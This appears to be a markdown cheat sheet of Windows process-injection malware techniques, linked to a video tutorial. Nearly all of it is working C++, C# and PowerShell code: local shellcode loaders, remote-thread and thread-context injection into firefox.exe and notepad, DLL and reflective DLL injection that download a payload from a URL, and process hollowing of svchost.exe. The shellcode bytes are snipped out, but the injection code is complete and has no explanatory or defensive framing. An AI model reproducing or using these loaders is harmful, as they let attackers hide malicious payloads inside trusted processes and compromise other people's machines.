
[C++ Shellcode Injection Tutorial](https://www.youtube.com/watch?v=FmCDVwA5kYQ&list=PLt9cUwGw6CYF0RprRaBrC7De8_gt2Skov)

# Local Shellcode Injection
## C++
```c
#include <windows.h>

void main() {

	unsigned char payload[] = ....SNIP....
	unsigned int payloadSize = sizeof(payload);

	void* allocatedMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocatedMemory == 0) return;

	RtlMoveMemory(allocatedMemory, payload, payloadSize);

	DWORD oldProtect = 0;
	VirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
	if (thread == 0) return;

	WaitForSingleObject(thread, 0);
}
```

## CSharp
```csharp
using System.Runtime.InteropServices;
namespace LocalShellcodeInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            byte[] buf = new byte[] { ....SNIP.... };
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x4);

            Marshal.Copy(buf, 0, addr, size);

            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)size, 0x20, out oldProtect);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

# CreateRemoteThread Injection
## C++
```c
#include <windows.h>
#include <tlhelp32.h>

/*
 * EXITFUNC=thread
 */
unsigned char payload[] = ....SNIP....;
int payloadSize = sizeof(payload);

int GetProcessID(LPCWSTR processName)
{
	int pid = 0;
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(hProcessSnapshot, &processEntry);
	do
	{
		if (lstrcmpi(processName, processEntry.szExeFile) == 0)
		{
			CloseHandle(hProcessSnapshot);
			return processEntry.th32ProcessID;
		}
	} while (Process32Next(hProcessSnapshot, &processEntry));

	CloseHandle(hProcessSnapshot);
	return 0;
}

void Inject(HANDLE process, unsigned char* payload, int payloadSize)
{
	LPVOID remoteMemory = VirtualAllocEx(process, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);

	WriteProcessMemory(process, remoteMemory, payload, payloadSize, NULL);

	HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);

	// typedef struct _CLIENT_ID {HANDLE UniqueProcess;HANDLE UniqueThread;} CLIENT_ID, *PCLIENT_ID;
	// CLIENT_ID cid;
	// RtlCreateUserThread(process, NULL, FALSE, 0, 0, 0, remoteMemory, 0, &thread, &cid);
	
    // NtCreateThreadEx(&thread, GENERIC_ALL, NULL, process, (LPTHREAD_START_ROUTINE) remoteMemory, NULL, NULL, NULL, NULL, NULL, NULL);

	WaitForSingleObject(thread, -1);

	CloseHandle(thread);
}

void main()
{
	wchar_t target[] = L"firefox.exe";

	int pid = 0;
	pid = GetProcessID(target);

	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);

	Inject(process, payload, payloadSize);

	CloseHandle(process);
}
```

## CSharp
```csharp
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            Process[] expProcess = Process.GetProcessesByName("notepad");
            uint pid = (uint)expProcess[0].Id;

            IntPtr process = OpenProcess(0x1f0ff, false, pid);
            
            IntPtr memory = VirtualAllocEx(process, IntPtr.Zero, 0x1000, 0x3000, 0x4);

            byte[] buf = new byte[] { ....SNIP.... };

            IntPtr outSize;
            WriteProcessMemory(process, memory, buf, buf.Length, out outSize);

            uint old;
            VirtualProtectEx(process, memory, (UIntPtr)buf.Length, 0x20, out old);

            IntPtr thread = CreateRemoteThread(process, IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

# Thread Context Injection (crashes the target process) (C++)
```c
#include <windows.h>
#include <tlhelp32.h>

unsigned char payload[] = ....SNIP....;
unsigned int payloadSize = sizeof(payload);

int FindTarget(LPCWSTR procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpi(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


HANDLE FindThread(int pid) {

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);

	return hThread;
}

int InjectCTX(int pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	hThread = FindThread(pid);
	if (hThread == NULL) {
		return -1;
	}

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	SuspendThread(hThread);
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR)pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR)pRemoteCode;
#endif
	SetThreadContext(hThread, &ctx);

	return ResumeThread(hThread);
}


int main(void) {

	int pid = 0;
	HANDLE hProc = NULL;

	pid = FindTarget(L"firefox.exe");

	if (pid) {

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)pid);

		if (hProc != NULL) {
			InjectCTX(pid, hProc, payload, payloadSize);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```

# DLL Injection (from disk) (csharp)
```csharp
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dllName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\NAME.dll";
            String url = "URL";

            new WebClient().DownloadFile(url, dllName);

            Process[] expProcess = Process.GetProcessesByName("notepad");
            uint pid = (uint)expProcess[0].Id;

            IntPtr process = OpenProcess(0x1f0ff, false, pid);
            IntPtr memory = VirtualAllocEx(process, IntPtr.Zero, 0x1000, 0x3000, 0x4);

            IntPtr outSize;
            Boolean result = WriteProcessMemory(process, memory, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            CreateRemoteThread(process, IntPtr.Zero, 0, loadLibrary, memory, 0, IntPtr.Zero);
        }
    }
}
```

# Reflective DLL Injection (from memory) (powershell)
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData("URL/hi.dll")
$procid = (Get-Process -Name explorer).Id

Import-Module PATH/Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

# Process Hollowing (csharp)
```csharp
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        [DllImport("ntdll.dll", SetLastError = true)] static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
        [DllImport("kernel32.dll", SetLastError = true)]  public static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool result = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref pbi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr imageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, imageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[] { ....SNIP.... };

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}
```